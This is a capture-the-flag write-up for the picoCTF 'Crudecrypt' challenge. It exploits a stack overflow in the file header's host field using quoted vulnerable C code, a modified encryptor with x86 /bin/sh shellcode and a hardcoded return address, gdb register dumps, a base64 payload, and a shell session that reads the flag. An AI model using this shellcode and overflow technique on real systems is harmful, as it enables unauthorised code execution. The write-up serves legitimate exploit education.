### Solved by barrebas

Crudecrypt is a 180 point challenge. 

We are given access to a program that can encrypt and decrypt a file. The program does not try to sanitize user input when decrypting:

```c
void decrypt_file(FILE* enc_file, FILE* raw_file, unsigned char* key) {
    int size = file_size(enc_file);
    char* enc_buf = calloc(1, size);
    fread(enc_buf, 1, size, enc_file);

    if(decrypt_buffer(enc_buf, size, (char*)key, 16) != 0) {
        printf("There was an error decrypting the file!\n");
        return;
    }

    char* raw_buf = enc_buf;
    file_header* header = (file_header*) raw_buf;

    if(header->magic_number != MAGIC) {
        printf("Invalid password!\n");
        return;
    }

    if(!check_hostname(header)) { 
        printf("[#] Warning: File not encrypted by current machine.\n");
    }
    
    // snip
    
bool check_hostname(file_header* header) {
    char saved_host[HOST_LEN], current_host[HOST_LEN];
    
    // unsafe strncpy if we supply a large string for header->host
    strncpy(saved_host, header->host, strlen(header->host));
    safe_gethostname(current_host, HOST_LEN);
    return strcmp(saved_host, current_host) == 0;
}
```

If the attacker can supply an encrypted file header with a large host field, then we can overflow the saved_host array on the stack & overwrite EIP. We modified the source of crudecrypt.c to generate such a file:

```c
void encrypt_file(FILE* raw_file, FILE* enc_file, unsigned char* key) {
    int size = file_size(raw_file);
    size_t block_size = MULT_BLOCK_SIZE(sizeof(file_header) + size);
    char* padded_block = calloc(1, block_size);

    file_header header;
    init_file_header(&header, size);
    //safe_gethostname(header.host, HOST_LEN);
    strcpy(header.host, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
```

We encrypted the payload using this modified crudecrypt.c. Then we decrypted it, observing the crash!

```
#0  0x45454545 in ?? ()
(gdb) i r
eax            0xffffff00	-256
ecx            0x73	115
edx            0xffffd660	-10656	> perfect pointer to start of buffer
ebx            0xf7dea000	-136404992
esp            0xffffd690	0xffffd690
ebp            0x44444444	0x44444444
esi            0x0	0
edi            0x0	0
eip            0x45454545	0x45454545
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

Looks like ALSR is off! There was no `jmp edx` in the binary that I could find, so instead, let's just jump to the buffer:

```c

void encrypt_file(FILE* raw_file, FILE* enc_file, unsigned char* key) {
    int size = file_size(raw_file);
    size_t block_size = MULT_BLOCK_SIZE(sizeof(file_header) + size);
    char* padded_block = calloc(1, block_size);

    file_header header;
    init_file_header(&header, size);
    //safe_gethostname(header.host, HOST_LEN);
    char payload[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80""BBCCCCDDDD\x30\xd6\xff\xff""FFFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    strcpy(header.host, payload);
```

compile & run:

```
bas@tritonal:~/tmp/picoctf/crudecrypt$ gcc -o exploit exploit.c -lcrypto -lmcrypt -lssl -m32
bas@tritonal:~/tmp/picoctf/crudecrypt$ ./exploit encrypt ./a ./b
-=- Welcome to CrudeCrypt 0.1 Beta -=-
-> File password:         

=> Encrypted file successfully
*** Error in `./exploit': free(): invalid pointer: 0x0920f300 ***
Aborted (core dumped)
bas@tritonal:~/tmp/picoctf/crudecrypt$ cat b |base64
qmikXTf65Xauen/t3a0FDf1uZMI3baSe5I9hTVEJ5t04R0Vb8RgBltvIwvCvmbaOtou7THTwR5Vy
B9dA2GyFxMLF/wyNDY9V/y2bveRKWLam5xehXkNXQFSMhUJcd3RNwfgFxVlYswx4VfW1CiqmV45S
ZzbvWLRmeRdk1vyxXQSq0nyDhcPi8GhwnKp6R1ri
```

We transferred the base64 encoded payload to remote machine. We had to adjust the pointer to the shellcode because the address changes on stack due to environment changing. We found this new pointer by simply running gdb. 

```
pico1139@shell:~$ .///////////////crude_crypt decrypt ./sp ./bleh
-=- Welcome to CrudeCrypt 0.1 Beta -=-
-> File password: 

Segmentation fault (core dumped)
...
#0  0xffffd674 in ?? ()
(gdb) i r
eax            0xffffff00	-256
ecx            0xb4	180
edx            0xffffd5f2	-10766
...
(gdb) x/s 0xffffd5f2
0xffffd5f2:	"Ph//shh/bin\211\343\215T$\b...BBCCCCDDDD"
(gdb) x/2i 0xffffd5f0
   0xffffd5f0:	xor    %eax,%eax
   0xffffd5f2:	push   %eax
```

After adjusting the address to `0xffffd5f0` in the exploit, we end up with a shell! A NOP sled would've been easy, in this case. 

```
pico1139@shell:~$ cat b |base64 -d > ./sp
pico1139@shell:~$ /home/crudecrypt/crude_crypt decrypt ./sp ./bleh
-=- Welcome to CrudeCrypt 0.1 Beta -=-
-> File password: 

$ id
uid=11066(pico1139) gid=1017(picogroup) egid=1012(crudecrypt) groups=1017(picogroup)
$ whoami
pico1139
$ cat /home/crudecrypt/flag.txt
writing_software_is_hard
```

The flag is `writing_software_is_hard`.
